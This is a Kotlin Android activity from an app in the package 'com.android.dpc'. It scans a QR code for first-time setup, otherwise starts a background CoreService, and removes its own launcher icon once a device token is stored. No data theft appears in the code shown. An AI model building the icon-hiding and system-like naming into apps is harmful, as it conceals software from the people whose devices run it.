package com.android.dpc

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log

class MainActivity : Activity() {
    companion object {
        private const val TAG = "MainActivity"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Check if we need to show QR scanner or start service
        val prefs = getSharedPreferences("spectratm_config", Context.MODE_PRIVATE)
        val hasToken = prefs.getString("device_token", null) != null
        
        if (!hasToken && intent?.getBooleanExtra("show_qr_scanner", false) == true) {
            Log.d(TAG, "Starting QR Scanner for initial setup")
            // Show QR scanner for first-time setup
            val qrIntent = Intent(this, QRScannerActivity::class.java)
            startActivity(qrIntent)
        } else {
            Log.d(TAG, "Starting CoreService")
            // Start service normally
            val serviceIntent = Intent(this, CoreService::class.java)
            startForegroundService(serviceIntent)
        }
        
        // Remove icon from launcher after first run
        if (hasToken) {
            hideFromLauncher()
        }
        
        // Finish activity
        finish()
    }
    
    private fun hideFromLauncher() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        )
    }
}